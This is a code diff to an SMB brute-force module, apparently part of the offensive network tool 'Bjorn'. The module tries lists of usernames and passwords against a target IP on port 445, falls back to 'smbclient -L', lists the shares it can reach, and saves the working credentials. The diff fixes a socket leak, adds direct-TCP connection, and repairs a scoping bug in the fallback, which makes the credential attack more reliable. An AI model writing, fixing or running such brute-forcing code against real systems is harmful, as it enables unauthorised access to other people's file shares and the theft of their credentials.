@@ -90,7 +90,12 @@ class SMBConnector:
         """
         Attempt to connect to an SMB service using the given credentials.
         """
-        conn = SMBConnection(user, password, "Bjorn", "Target", use_ntlm_v2=True)
+        # SMB-1: SMBConnection.close() was only called on the success path.
+        # On exception (refused, timeout, auth failure) the socket leaked.
+        # SMB-2: is_direct_tcp=True is required for direct 445 connects
+        # per pysmb docs (otherwise it tries NetBIOS on 139).
+        conn = SMBConnection(user, password, "Bjorn", "Target",
+                             use_ntlm_v2=True, is_direct_tcp=True)
         try:
             conn.connect(adresse_ip, 445)
             shares = conn.listShares()
@@ -104,10 +109,17 @@ class SMBConnector:
                     logger.info(f"Access to share {share.name} successful on {adresse_ip} with user '{user}'")
                 except Exception as e:
                     logger.error(f"Error accessing share {share.name} on {adresse_ip} with user '{user}': {e}")
-            conn.close()
             return accessible_shares
         except Exception as e:
             return []
+        finally:
+            # Always close, even on exception. close() is safe to call on
+            # a never-connected connection (it's a no-op for the NetBIOS
+            # socket if connect() never succeeded).
+            try:
+                conn.close()
+            except Exception:
+                pass
 
     def smbclient_l(self, adresse_ip, user, password):
         """
@@ -182,10 +194,14 @@ class SMBConnector:
 
         success_flag = [False]
         threads = []
-        
+
+        # SMB-3: the smbclient fallback previously ran OUTSIDE the
+        # with Progress(...) context, so progress.update(task_id, ...) raised
+        # NameError because progress and task_id were already out of scope.
+        # Both blocks now share the same Progress context.
         with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
             task_id = progress.add_task("[cyan]Bruteforcing SMB...", total=total_tasks)
-            
+
             for _ in range(10):  # Limit threads for RPi Zero (512MB RAM, 1 core)
                 t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
                 t.start()
@@ -204,24 +220,26 @@ class SMBConnector:
             for t in threads:
                 t.join()
 
-        # If no success with direct SMB connection, try smbclient -L
-        if not success_flag[0]:
-            logger.info(f"No successful authentication with direct SMB connection. Trying smbclient -L for {adresse_ip}")
-            for user in self.users:
-                for password in self.passwords:
-                    progress.update(task_id, advance=1)
-                    shares = self.smbclient_l(adresse_ip, user, password)
-                    if shares:
-                        with self.lock:
-                            for share in shares:
-                                if share not in IGNORED_SHARES:
-                                    self.results.append([mac_address, adresse_ip, hostname, share, user, password, port])
-                                    logger.success(f"(SMB) Found credentials for IP: {adresse_ip} | User: {user} | Share: {share} using smbclient -L")
-                                    self.save_results()
-                                    self.removeduplicates()
-                                    success_flag[0] = True
-                    if self.shared_data.timewait_smb > 0:
-                        time.sleep(self.shared_data.timewait_smb)  # Wait for the specified interval before the next attempt
+            # If no success with direct SMB connection, try smbclient -L
+            # INSIDE the same with Progress context so progress/task_id are
+            # still valid (SMB-3).
+            if not success_flag[0]:
+                logger.info(f"No successful authentication with direct SMB connection. Trying smbclient -L for {adresse_ip}")
+                for user in self.users:
+                    for password in self.passwords:
+                        progress.update(task_id, advance=1)
+                        shares = self.smbclient_l(adresse_ip, user, password)
+                        if shares:
+                            with self.lock:
+                                for share in shares:
+                                    if share not in IGNORED_SHARES:
+                                        self.results.append([mac_address, adresse_ip, hostname, share, user, password, port])
+                                        logger.success(f"(SMB) Found credentials for IP: {adresse_ip} | User: {user} | Share: {share} using smbclient -L")
+                                        self.save_results()
+                                        self.removeduplicates()
+                                        success_flag[0] = True
+                        if self.shared_data.timewait_smb > 0:
+                            time.sleep(self.shared_data.timewait_smb)  # Wait for the specified interval before the next attempt
 
         return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful
 
